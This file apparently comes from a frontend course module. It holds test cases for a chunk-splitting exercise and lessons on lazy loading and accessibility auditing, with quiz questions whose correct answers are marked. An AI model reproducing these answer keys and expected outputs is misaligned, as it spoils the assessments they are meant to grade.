                c: { size: 3, imports: ["a"] },
              },
              ["a"],
              [],
            ],
            expected: { chunks: [{ name: "a", modules: ["a", "b", "c"], size: 6, loadedBy: ["a"] }], bytes: { a: 6 } },
            isEdgeCase: true,
          },
          {
            description: "imports of modules missing from the graph are treated as external and ignored",
            args: [
              { main: { size: 5, imports: ["react-dom/client"], dynamicImports: ["pages/Missing"] } },
              ["main"],
              [],
            ],
            expected: { chunks: [{ name: "main", modules: ["main"], size: 5, loadedBy: ["main"] }], bytes: { main: 5 } },
            isEdgeCase: true,
          },
          {
            description: "a module both statically and dynamically imported becomes its own entry point, shared with the importer",
            args: [
              {
                main: { size: 5, imports: ["lib/date"], dynamicImports: ["lib/date"] },
                "lib/date": { size: 70 },
              },
              ["main"],
              [],
            ],
            expected: {
              chunks: [
                { name: "main", modules: ["main"], size: 5, loadedBy: ["main"] },
                {
                  name: "shared(lib/date,main)",
                  modules: ["lib/date"],
                  size: 70,
                  loadedBy: ["lib/date", "main"],
                },
              ],
              bytes: { main: 75, "lib/date": 70 },
            },
            isEdgeCase: true,
          },
          {
            description: "no entries, no chunks",
            args: [SPA, [], VENDOR_GROUP],
            expected: { chunks: [], bytes: {} },
            isEdgeCase: true,
          },
        ],
      },
    },
    {
      id: "feperf-lazy-loading",
      moduleId: "fe-security-perf",
      trackId: "frontend",
      title: "Lazy Loading Images & Components",
      summary:
        "Lazy loading defers work the user may never need, but loading priority is zero-sum: everything you correctly delay frees bandwidth and main-thread time for what's visible, and everything you delay by mistake gets slower. Native `loading=\"lazy\"` on `<img>` and `<iframe>` lets the browser fetch them only as they approach the viewport, using distance thresholds that it tunes to the connection, with no JavaScript or IntersectionObserver code.\n\nThe expensive mistake is lazy-loading what's above the fold, above all the LCP image. A lazy image isn't requested until layout shows it's near the viewport, so it misses the preload scanner and starts late. Hero images belong in the initial HTML as plain `<img>` tags with `fetchpriority=\"high\"` and no `loading=\"lazy\"`; a carousel should prioritize only its first slide, and marking everything high priority prioritizes nothing. Always set `width` and `height` (or `aspect-ratio`) so the browser reserves the box and the arriving image doesn't shift layout.\n\nResponsive images keep the bytes honest: `srcset` with width descriptors lists candidates, and `sizes` tells the browser the rendered width before layout, so it can pick the smallest adequate file for the screen's pixel density. Without `sizes` the browser assumes `100vw` and downloads oversized files for small slots; `sizes=\"auto\"` is only allowed on lazy images, whose layout is known before the fetch. `<picture>` adds AVIF and WebP with fallbacks.\n\nComponents follow the same logic. `React.lazy(() => import(\"./Chart\"))` inside `<Suspense fallback>` moves a component into its own chunk, loaded on first render. The module needs a default export (or a `.then` that maps a named one), `lazy` must be called at module level (declared inside a component, it resets state on every render), and a boundary placed too high blanks large parts of the page. Prefetch on intent, such as hover or route prefetching, so lazy doesn't mean slow.",
      level: "intermediate",
      estMinutes: 45,
      webRefs: [
        { label: "web.dev: Browser-level image lazy loading", url: "https://web.dev/articles/browser-level-image-lazy-loading", kind: "docs" },
        { label: "web.dev: The performance effects of too much lazy loading", url: "https://web.dev/articles/lcp-lazy-loading", kind: "article" },
        { label: "web.dev: Optimize resource loading with the Fetch Priority API", url: "https://web.dev/articles/fetch-priority", kind: "article" },
        { label: "MDN: Responsive images", url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Guides/Responsive_images", kind: "docs" },
      ],
      video: {
        title: "How To Load Images Like A Pro",
        channel: "Web Dev Simplified",
        url: "https://www.youtube.com/watch?v=hJ7Rg1821Q0",
        videoId: "hJ7Rg1821Q0",
        durationLabel: "15:47",
      },
      alternateVideos: [
        {
          title: "The # 1 Mistake Websites Make with Lazy Loading Images",
          channel: "DebugBear",
          url: "https://www.youtube.com/watch?v=aTjlv0g_QC0",
          videoId: "aTjlv0g_QC0",
          durationLabel: "24:27",
        },
        {
          title: "Make Your Site Lightning Fast With Responsive Images",
          channel: "Web Dev Simplified",
          url: "https://www.youtube.com/watch?v=fp9eVtkQ4EA",
          videoId: "fp9eVtkQ4EA",
          durationLabel: "14:13",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "feperf-lazy-loading-q1",
          prompt:
            "To \"optimize images\", a team adds `loading=\"lazy\"` to every `<img>`, including the full-width hero at the top of the landing page. Field LCP gets worse. Why?",
          options: [
            "A lazy image isn't requested until layout confirms it's near the viewport, so the LCP image misses the preload scanner and starts downloading late",
            "Lazy images are always downloaded at the lowest resolution first",
            "`loading=\"lazy\"` disables the HTTP cache for that image",
            "It can't: lazy loading only affects images below the fold",
          ],
          correctIndex: 0,
          explanation:
            "Lazy loading trades a later start for fewer wasted bytes, which is the wrong trade for the most important image on the page. Remove `loading=\"lazy\"` from above-the-fold images and add `fetchpriority=\"high\"` to the LCP one.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-lazy-loading-q2",
          prompt: "On a long product page, which should get `loading=\"lazy\"`? (Select all that apply.)",
          options: [
            "Thumbnails in the \"You may also like\" grid near the bottom",
            "A YouTube embed `<iframe>` in the reviews section",
            "The main product photo at the top",
            "The logo in the site header",
            "Photos attached to reviews far down the page",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 4],
          explanation:
            "Lazy-load what starts well below the fold (iframes are often the biggest win). The main photo is likely the LCP element and the logo is visible immediately, so both should load eagerly.",
        },
        {
          id: "feperf-lazy-loading-q3",
          prompt: "A developer adds `fetchpriority=\"high\"` to all 30 images on a page. What's the effect?",
          options: [
            "Little or none: priority is relative, so raising everything prioritizes nothing, and the real LCP image competes with the rest",
            "All 30 images load before any CSS or JavaScript",
            "The browser ignores the page's images until the attribute is removed",
            "Every image is fetched over its own dedicated connection",
          ],
          correctIndex: 0,
          explanation:
            "`fetchpriority` is a hint that adjusts a resource's priority relative to others. Use it on the one or two images that matter (the LCP image, the first carousel slide), and `low` for images you want to deprioritize.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-lazy-loading-q4",
          prompt: "`<img srcset=\"card-400.jpg 400w, card-800.jpg 800w, card-1600.jpg 1600w\" src=\"card-800.jpg\">` has no `sizes` attribute. What does the browser assume?",
          options: [
            "That the image will be displayed at `100vw`, so it may pick a much larger file than the slot needs",
            "That the image is displayed at its intrinsic width",
            "It ignores `srcset` and always uses `src`",
            "It waits for layout to measure the slot, then chooses",
          ],
          correctIndex: 0,
          explanation:
            "Image selection happens before layout, so without `sizes` the browser uses the default `100vw`. For a card that's 300 px wide on a laptop, that can mean downloading the 1600w file. Only lazy images may use `sizes=\"auto\"`.",
        },
        {
          id: "feperf-lazy-loading-q5",
          prompt: "Your CSS already sets `img { width: 100%; height: auto; }`. Why still put `width` and `height` attributes on each `<img>`?",
          options: [
            "Browsers compute an aspect ratio from them and reserve the right height before the image loads, preventing layout shift",
            "They override the CSS so the image always renders at that fixed size",
            "They tell the browser which `srcset` candidate to download",
            "They are required for `loading=\"lazy\"` to work",
          ],
          correctIndex: 0,
          explanation:
            "Modern browsers map the attributes to a default `aspect-ratio`, so `height: auto` still gets a correct placeholder box. Without them the image occupies zero height until it arrives, then pushes content down (CLS).",
        },
        {
          id: "feperf-lazy-loading-q6",
          prompt:
            "What's wrong with this?\n\n```jsx\nfunction Dashboard() {\n  const Chart = lazy(() => import(\"./Chart\"));\n  return (\n    <Suspense fallback={<Spinner />}>\n      <Chart />\n    </Suspense>\n  );\n}\n```",
          options: [
            "`lazy` is called on every render, creating a new component type each time, so `Chart` remounts and loses its state; declare it at module level",
            "`lazy` must be awaited",
            "`Suspense` must be placed inside `Chart`",
            "Nothing: React caches `lazy` calls by their import path",
          ],
          correctIndex: 0,
          explanation:
            "React's docs warn against declaring lazy components inside other components: each render produces a different component type, so React tears down the old subtree. The import itself is cached by the module system, but the component state isn't.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-lazy-loading-q7",
          prompt: "`Chart.jsx` only has `export function Chart() {...}`. How do you lazy-load it?",
          options: [
            "`lazy(() => import(\"./Chart\").then((m) => ({ default: m.Chart })))`",
            "`lazy(() => import(\"./Chart\").Chart)`",
            "`lazy(import(\"./Chart\"), \"Chart\")`",
            "`lazy(() => import(\"./Chart\"))`, since React finds the first exported component",
          ],
          correctIndex: 0,
          explanation:
            "`lazy` expects a function returning a promise for a module whose `default` export is the component. Mapping the named export to `default` (or adding a default export) satisfies that.",
        },
        {
          id: "feperf-lazy-loading-q8",
          prompt:
            "The only `<Suspense>` boundary wraps the whole app. When a user opens a lazily loaded settings panel, what happens and what's better?",
          options: [
            "The entire page is replaced by the fallback while the chunk loads; put a boundary right around the lazy panel",
            "Only the panel shows the fallback, because boundaries apply to the nearest lazy component",
            "Nothing is shown until the chunk loads, then the panel appears",
            "React throws because lazy components need their own boundary",
          ],
          correctIndex: 0,
          explanation:
            "A suspending component shows the fallback of its nearest `Suspense` ancestor, so a root-level boundary blanks everything. Boundaries close to the lazy content keep the rest of the UI on screen.",
        },
        {
          id: "feperf-lazy-loading-q9",
          prompt: "A hero carousel has eight slides, each with a large image. How should the images load?",
          options: [
            "The first slide eagerly with `fetchpriority=\"high\"`; the others lazily (or low priority) because they aren't visible yet",
            "All eight eagerly with `fetchpriority=\"high\"` so swiping is instant",
            "All eight with `loading=\"lazy\"`, since carousels are dynamic",
            "The first slide lazily and the rest eagerly, to spread the load",
          ],
          correctIndex: 0,
          explanation:
            "Only the first slide is visible and it's usually the LCP element. Loading all eight at high priority makes them compete with it; the rest can load as the user approaches them.",
        },
        {
          id: "feperf-lazy-loading-q10",
          prompt:
            "An older gallery uses a JavaScript lazy-loader that copies `data-src` into `src` when images become visible, on every image including the first row. What's the downside compared with native lazy loading?",
          options: [
            "No image loads until the script has downloaded and run, and the preload scanner can't see the real URLs, which delays above-the-fold images",
            "Native lazy loading requires a service worker, so the script is the only option on some browsers",
            "JavaScript lazy-loaders always download every image twice",
            "Native lazy loading doesn't work for images inside `<picture>`",
          ],
          correctIndex: 0,
          explanation:
            "With `data-src`, visible images wait for JavaScript and are invisible to the browser's early discovery. Native `loading=\"lazy\"` needs no script, and eager images keep a normal `src` the preload scanner can find.",
        },
      ],
    },
    {
      id: "feperf-a11y-auditing",
      moduleId: "fe-security-perf",
      trackId: "frontend",
      title: "Accessibility Auditing: axe, Lighthouse & Manual Testing",
      summary:
        "Accessibility auditing asks whether people using screen readers, keyboards, magnification or voice control can complete your flows; automated tools answer only part of that. axe-core (the engine behind axe DevTools and Lighthouse's accessibility audits), WAVE and linters such as `eslint-plugin-jsx-a11y` reliably catch machine-checkable failures: missing alt text, unlabeled form controls, low contrast, empty buttons and links, invalid ARIA, duplicate ids. They're still worth running: the WebAIM Million 2026 found detectable WCAG failures on 95.9% of home pages, led by low-contrast text on 83.9%.\n\nTools can't judge meaning or behavior: whether alt text is accurate, headings reflect the structure, focus order follows the visual order, a custom dropdown works from the keyboard, focus moves into a modal, stays there and returns afterwards, or dynamic updates are announced. That's why coverage estimates vary: Deque's 2021 study found its automated rules caught 57% of issues in first-time audits (by volume, dominated by a few common issue types), while GOV.UK's 2017 test found the best tool detected about 40% of deliberately planted barriers and Chrome's built-in audit 17%. A Lighthouse score of 100 means no automated audit failed, not that the page is accessible; the score is a weighted average of pass/fail audits with no partial credit.\n\nA practical audit layers both: axe in CI against rendered pages (Playwright or `vitest-axe`), then a manual pass per template. Use only the keyboard (Tab, Shift+Tab, Enter, Space, Escape, arrow keys, with visible focus everywhere), zoom to 200% and check reflow, inspect the accessibility tree in DevTools, and test with a screen reader (VoiceOver, NVDA, TalkBack). Bad ARIA is worse than none. Audit against WCAG 2.2 AA, which added criteria such as Focus Not Obscured and a 24×24 px minimum target size; the European Accessibility Act has applied to many consumer products and services since June 2025.",
      level: "advanced",
      estMinutes: 55,
      webRefs: [
        { label: "web.dev: Automated accessibility testing", url: "https://web.dev/learn/accessibility/test-automated", kind: "docs" },
        { label: "web.dev: Manual accessibility testing", url: "https://web.dev/learn/accessibility/test-manual", kind: "article" },
        { label: "Chrome for Developers: Lighthouse accessibility score", url: "https://developer.chrome.com/docs/lighthouse/accessibility/scoring", kind: "docs" },
        { label: "GOV.UK: What we found when we tested tools on the world's least-accessible webpage", url: "https://accessibility.blog.gov.uk/2017/02/24/what-we-found-when-we-tested-tools-on-the-worlds-least-accessible-webpage/", kind: "article" },
      ],
      video: {
        title: "Debugging accessibility with Chrome DevTools",
        channel: "Chrome for Developers",
        url: "https://www.youtube.com/watch?v=Th-nv-SCj4Q",
        videoId: "Th-nv-SCj4Q",
        durationLabel: "13:18",
      },
      alternateVideos: [
        {
          title: "How to get the most out of Deque's axe DevTools accessibility browser extension",
          channel: "Deque Systems",
          url: "https://www.youtube.com/watch?v=F0hVZIzjDLk",
          videoId: "F0hVZIzjDLk",
          durationLabel: "30:31",
        },
        {
          title: "The Only Accessibility Video You Will Ever Need",
          channel: "Web Dev Simplified",
          url: "https://www.youtube.com/watch?v=2oiBKSjOOFE",
          videoId: "2oiBKSjOOFE",
          durationLabel: "37:32",
          startSeconds: 2005,
          chapterLabel: "Accessibility Testing",
        },
      ],
      challengeType: "quiz",
      quiz: [
        {
          id: "feperf-a11y-auditing-q1",
          prompt: "The checkout page scores 100 in Lighthouse's accessibility category. What does that tell you?",
          options: [
            "None of Lighthouse's automated audits failed; keyboard operability, focus management and screen-reader experience are still unverified",
            "The page conforms to WCAG 2.2 AA",
            "A screen reader user can complete checkout",
            "The page passes the European Accessibility Act",
          ],
          correctIndex: 0,
          explanation:
            "The score is a weighted average of pass/fail automated checks based on axe. Most success criteria need human judgment, which is why a perfect score and an unusable flow can coexist.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-a11y-auditing-q2",
          prompt: "Which issues can automated tools such as axe detect reliably? (Select all that apply.)",
          options: [
            "An `<img>` with no `alt` attribute",
            "Body text with a 2.8:1 contrast ratio on a solid background",
            "An `<input>` with no associated label",
            "Alt text that describes the wrong image",
            "A modal that doesn't return focus to its trigger when closed",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Presence of attributes, computed contrast and label associations are machine-checkable. Whether alt text is accurate, and how focus behaves over time, need a person.",
        },
        {
          id: "feperf-a11y-auditing-q3",
          prompt:
            "A custom select built from `<div>`s has `role=\"listbox\"` and `role=\"option\"`, and axe reports no violations. What should the audit check next?",
          options: [
            "Keyboard operation (open, arrow keys, Enter to select, Escape to close) and how a screen reader announces the state; automated rules can't verify behavior",
            "Nothing: an axe pass with correct roles means it's accessible",
            "Only the color contrast of the options",
            "Whether the div has a `data-testid` for automation",
          ],
          correctIndex: 0,
          explanation:
            "Roles promise behavior that you have to implement (see the ARIA Authoring Practices patterns); axe can check that roles are valid, not that the keys work. A native `<select>` gives you all of that for free.",
        },
        {
          id: "feperf-a11y-auditing-q4",
          prompt:
            "To hide a cookie banner's decorative backdrop from screen readers, a developer puts `aria-hidden=\"true\"` on its container, which also holds the \"Accept\" button. What happens?",
          options: [
            "The button leaves the accessibility tree but stays focusable, so keyboard screen-reader users land on something announced as nothing",
            "The button is hidden visually as well",
            "Screen readers still announce the button because buttons override `aria-hidden`",
            "Nothing, because `aria-hidden` only affects images",
          ],
          correctIndex: 0,
          explanation:
            "`aria-hidden` removes an entire subtree from the accessibility tree without affecting focus or visibility, and axe flags focusable content inside it. That's a textbook case of ARIA making things worse; `inert` hides and disables focus together.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-a11y-auditing-q5",
          prompt: "Which behaviors should a modal dialog have? (Select all that apply.)",
          options: [
            "Focus moves into the dialog when it opens",
            "Focus can't reach the page behind it while it's open (trapped, or the rest is `inert`)",
            "Focus returns to the element that opened it when it closes",
            "Focus stays on the trigger button so users remember what opened it",
            "Escape is disabled to avoid closing it by accident",
          ],
          correctIndex: 0,
          correctIndices: [0, 1, 2],
          explanation:
            "Keyboard and screen-reader users need focus to follow the dialog and come back afterwards, and Escape should close it. A native `<dialog>` opened with `showModal()` provides most of this, including making the rest of the page inert.",
        },
        {
          id: "feperf-a11y-auditing-q6",
          prompt: "An \"Added to cart\" toast appears after clicking a button, but screen readers say nothing. What's the most reliable fix?",
          options: [
            "Render a live region (`role=\"status\"` or `aria-live=\"polite\"`) when the page loads and insert the message into it later",
            "Create the toast element with `aria-live=\"polite\"` at the moment the message appears",
            "Move keyboard focus to the toast on every addition",
            "Give the toast `role=\"presentation\"`",
          ],
          correctIndex: 0,
          explanation:
            "Screen readers watch live regions that already exist for changes; a region created together with its content is often not announced. Moving focus for a passive message disrupts the user's place on the page.",
          isEdgeCaseOrInterviewQuestion: true,
        },
        {
          id: "feperf-a11y-auditing-q7",
          prompt: "Which of these is a new success criterion at level AA in WCAG 2.2?",
          options: [
            "Target Size (Minimum): pointer targets at least 24×24 CSS pixels, with exceptions",
            "4.1.1 Parsing, requiring valid HTML",
            "A 3:1 contrast ratio for normal body text",
            "Captions for prerecorded video",
          ],
          correctIndex: 0,
          explanation:
            "WCAG 2.2 (October 2023) added Target Size (Minimum), Focus Not Obscured (Minimum), Dragging Movements and Accessible Authentication at AA, and removed 4.1.1 Parsing. Normal text still needs 4.5:1, and captions date back to WCAG 2.0.",
        },
        {
          id: "feperf-a11y-auditing-q8",
          prompt: "The team already runs `eslint-plugin-jsx-a11y`. Why also run axe against rendered pages in CI?",
          options: [
            "Linting sees source, not the rendered result: contrast, computed accessible names, duplicate ids and issues from CSS or runtime state only exist in the rendered DOM",
            "axe is faster than ESLint on large codebases",
            "ESLint rules can't be enabled for TypeScript files",
            "axe also verifies keyboard focus order automatically",
          ],
          correctIndex: 0,
          explanation:
            "Static analysis catches things such as missing `alt` props early, while axe evaluates the actual DOM and styles. Neither can judge focus order or whether the experience makes sense.",
        },
        {
          id: "feperf-a11y-auditing-q9",
          prompt: "What's a sound manual pass for a new page template?",
          options: [
            "Keyboard only (Tab, Shift+Tab, Enter, Space, Escape, arrows) with visible focus, zoom to 200% and check reflow, inspect the accessibility tree, then test key flows with a screen reader",
            "Run Lighthouse three times and average the scores",
            "Turn on the OS high-contrast mode and check the logo",
            "Ask an AI assistant to read the HTML and rate it",
          ],
          correctIndex: 0,
          explanation:
            "That sequence covers operability, visible focus, low-vision reflow and what assistive technology actually announces. Repeating an automated tool doesn't add coverage.",
        },
        {
          id: "feperf-a11y-auditing-q10",
          prompt:
            "Deque reports automated testing finds 57% of accessibility issues, while GOV.UK found the best tool caught about 40% of barriers and Chrome's audit 17%. How can both be true?",
          options: [
            "They measure different things: Deque counted issue instances in real audits, where a few automatable types such as contrast dominate volume, while GOV.UK counted distinct planted barriers",
            "Deque's tools are three times better than every other tool",
            "GOV.UK tested only screen readers, not automated tools",
            "Automated tools have regressed since 2017",
          ],
          correctIndex: 0,
          explanation:
            "Counting by volume favors frequent, machine-detectable issues; counting distinct barrier types exposes how many kinds of problems need human judgment. Either way, automated tools cover a fraction.",
        },
      ],
    },
  ],
} satisfies Module;
